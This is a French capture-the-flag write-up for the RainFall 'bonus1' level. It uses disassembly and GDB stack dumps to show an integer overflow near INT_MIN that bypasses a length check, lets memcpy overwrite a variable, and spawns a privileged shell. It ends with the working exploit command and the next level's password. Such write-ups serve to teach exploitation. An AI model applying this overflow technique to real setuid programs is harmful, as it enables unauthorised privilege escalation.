# Bonus 1

Ce que nous pouvons lire :

- Le programme attend deux arguments.
- Un atoi est là pour convertir le 1er argument en integer et on met le resultat dans une variable (local_14).
- S'il est strictement inférieur a 10 on entre danas la condition.
- Nous mettons le deuxième argument dans une variable (buffer) alouée 40 char sur la stack avec memcpy, en spécifiant une longueur totale de la valeur de atoi * 4 (donc 36 max.)
- Enfin, si la variable local_14 est égale à l'adresse "0x574f4c46", un shell est ouvert avec les droits supérieurs.

Nous devons donc modifier la valeur de local_14 et pour se faire utiliser memcopy pour l'écraser.

Mais comment vu que nous pouvons copier que 36 char.

```
Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax
   0x08048430 <+12>:	add    $0x4,%eax
   0x08048433 <+15>:	mov    (%eax),%eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    0x3c(%esp),%eax
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   0x08048464 <+64>:	lea    0x14(%esp),%eax
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   ====>  0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
```
Dans GDB :

- Nous allons poser un breakpoint juste après l'appel de memcpy pour voir ce qu'il se passe sur la stack.

```
Starting program: /home/user/bonus1/bonus1 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048478 in main ()
(gdb) x/100x $esp
0xbffff6b0:	0xbffff6c4	0xbffff8cc	0x00000024	0x080482fd
===> 0xbffff6c0:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
===> 0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
===> 0xbffff6e0:	0x41414141	0x41414141	0x080484b9	0x00000009
0xbffff6f0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
0xbffff700:	0x00000003	0xbffff794	0xbffff7a4	0xb7fdc858
```

L'adresse du buffer est "0xbffff6c4", 36 "A" sont copiés, puis viens l'adresse d'EIP pour retrouver la suite du programme, et ensuite nous constatons que "local_14" est juste après.

La technique utilisée pour écraser cette adresse, va être d'exploiter la non vérification de l'INT_MIN (local_14 < 10) pour augmenter la taille du nombre de char copié dans memcpy.

En effet, donner un nombre aux alentours du INT MIN va modifier les 32 bits et donner un nombre positif au buffer.

Exemple :
```
Starting program: /home/user/bonus1/bonus1 9 Starting program: /home/user/bonus1/bonus1 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048478 in main ()
(gdb) x/100x $esp
0xbffff6b0:	0xbffff6c4	0xbffff8cc	0x00000024	0x080482fd
===> 0xbffff6c0:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x080484b9	0x00000009 <=== 9 * 4 = 36 char copiés.


Starting program: /home/user/bonus1/bonus1 -2147483648 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) x/100x $esp
0xbffff6a0:	0xbffff6b4	0xbffff8cc	0x00000000	0x080482fd
0xbffff6b0:	0xb7fd13e4	0x00080000	0x08049764	0x080484d1
0xbffff6c0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6d0:	0xb7fed280	0x00000000	0x080484b9	0x80000000 <=== 0 char copié.


Starting program: /home/user/bonus1/bonus1 -2147483647 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048478 in main ()
(gdb) x/100x $esp
0xbffff6a0:	0xbffff6b4	0xbffff8cc	0x00000004	0x080482fd
===> 0xbffff6b0:	0xb7fd13e4	0x41414141	0x08049764	0x080484d1
0xbffff6c0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6d0:	0xb7fed280	0x00000000	0x080484b9	0x80000001 <=== 1 * 4 = 1 char copié et (local_14 vaut 0x80000001)
```

Après plusieurs essais nous arrivons à trouver la valeur du 1er argument pour pouvoir copier 44 chars et ecraser la valeur de local_14.

```
Starting program: /home/user/bonus1/bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048478 in main ()
(gdb) x/100x $esp
0xbffff6a0:	0xbffff6b4	0xbffff8cc	0x0000002c	0x080482fd
0xbffff6b0:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141 <===
```

nous avons donc le 1er argument, le deuxième consiste à écrire 40 * "A" + l'adresse de la condition "0x574f4c46".

```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ pwd
/home/user/bonus1
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
